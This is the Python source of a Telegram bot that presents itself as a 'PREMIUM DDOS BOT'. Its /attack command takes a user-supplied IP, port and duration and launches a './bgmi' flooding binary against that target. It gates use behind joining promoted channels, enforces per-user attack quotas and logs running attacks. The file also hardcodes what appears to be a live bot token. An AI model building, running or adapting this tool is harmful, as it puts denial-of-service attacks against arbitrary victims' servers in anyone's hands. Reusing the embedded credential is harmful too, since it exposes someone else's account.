import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = '7686606251:AAF14WbWcb43b1F4UOkjbnpXg4co-QWvqfI'
ADMIN_USER_ID = 1604629264
CHANNELS = ['@NxTLvL07', '@NewServer07']
attack_in_progress = {}
user_attack_count = {}
approved_users = set()
MAX_ATTACKS = 3
DAILY_LIMIT = 25
ACTIVE_ATTACKS_FILE = 'active.txt'
BLOCKED_PORTS = {'8700', '20000', '443', '17500', '9031','20002', '20001'}  # Blocked ports

async def is_member(update: Update, context: CallbackContext) -> bool:
    user_id = update.effective_user.id

    try:
        for channel in CHANNELS:
            member = await context.bot.get_chat_member(channel, user_id)
            if member.status not in ['member', 'administrator', 'creator']:
                if user_id in approved_users:
                    approved_users.remove(user_id)  # Remove from approved users
                join_message = (
                    "❌ You must join both channels before using this bot:\n"
                    "➡️ [Join Channel 1](https://t.me/NxTLvL07)\n"
                    "➡️ [Join Channel 2](https://t.me/NewServer07)"
                )
                await update.message.reply_text(join_message, parse_mode='Markdown', disable_web_page_preview=True)
                return False
        return True
    except:
        return False

async def start(update: Update, context: CallbackContext):
    message = (
        "WELCOME TO PARADOX SERVER\n"
        "PRIMIUM DDOS BOT\n"
        "OWNER :- @LostBoiXD\n"
    )
    await update.message.reply_text(text=message, parse_mode='Markdown', disable_web_page_preview=True)

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress, user_attack_count, approved_users
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    username = update.effective_user.username or user_id
    args = context.args

    # Check if the user is still a member
    if not await is_member(update, context):
        return  # Exit if they left the channel

    # If the user is still a member, they remain approved
    approved_users.add(user_id)

    # Attack logic continues...
    if len(attack_in_progress) >= MAX_ATTACKS:
        await update.message.reply_text("⚠️ Max attacks limit reached. Try again later", parse_mode='Markdown')
        return

    if user_id != ADMIN_USER_ID and user_attack_count.get(user_id, 0) >= DAILY_LIMIT:
        await update.message.reply_text("⚠️ You have reached your daily attack limit", parse_mode='Markdown')
        return

    if len(args) != 3:
        await update.message.reply_text("⚠️ Usage: /attack <ip> <port> <time>", parse_mode='Markdown')
        return

    ip, port, time = args
    if port in BLOCKED_PORTS:
        await update.message.reply_text("⚠️ This port is blocked. Choose a different one", parse_mode='Markdown')
        return
    
    time = min(int(time), 120)
    attack_in_progress[chat_id] = (ip, port, time, username)
    user_attack_count[user_id] = user_attack_count.get(user_id, 0) + 1

    with open(ACTIVE_ATTACKS_FILE, 'a') as f:
        f.write(f"{username} - IP: {ip}, Port: {port}, Time: {time}\n")

    await update.message.reply_text(
        f"🚀 **Attack STARTED!**\n\n"
        f"🌐 IP: {ip}\n"
        f"🔌 PORT: {port}\n"
        f"⏰ TIME: {time} seconds\n",
        parse_mode='Markdown'
    )

    asyncio.create_task(run_attack(chat_id, ip, port, time, context, update.message.message_id))

async def run_attack(chat_id, ip, port, time, context, message_id):
    global attack_in_progress
    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {time} 350",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*⚠️ Error during the attack: {str(e)}*",
            parse_mode='Markdown',
            reply_to_message_id=message_id
        )

    finally:
        del attack_in_progress[chat_id]
        await context.bot.send_message(
            chat_id=chat_id,
            text= f"🏁 **Attack OVER!**\n\n"
                      f"🌐 IP: {ip}\n"
                      f"🔌 PORT: {port}\n"
                      f"⏰ TIME: {time} seconds\n",
            parse_mode='Markdown',
            reply_to_message_id=message_id
        )

async def outgoing(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("⚠️ Admin only command", parse_mode='Markdown')
        return
    
    if not attack_in_progress:
        await update.message.reply_text("No running attacks", parse_mode='Markdown')
        return
    
    attack_details = "\n".join([f"User: {data[3]}, IP: {data[0]}, Port: {data[1]}, Time: {data[2]}" for _, data in attack_in_progress.items()])
    await update.message.reply_text(f"*🔹 Active Attacks:*\n{attack_details}", parse_mode='Markdown')

async def broadcast(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("⚠️ Admin only command", parse_mode='Markdown')
        return
    
    message = " ".join(context.args)
    if not message:
        await update.message.reply_text("⚠️ Usage: /broadcast <message>", parse_mode='Markdown')
        return
    
    await context.bot.send_message(chat_id=CHANNELS[0], text=f"📢 {message}", parse_mode='Markdown')

# Main function
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("outgoing", outgoing))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.run_polling()

if __name__ == '__main__':
    main()
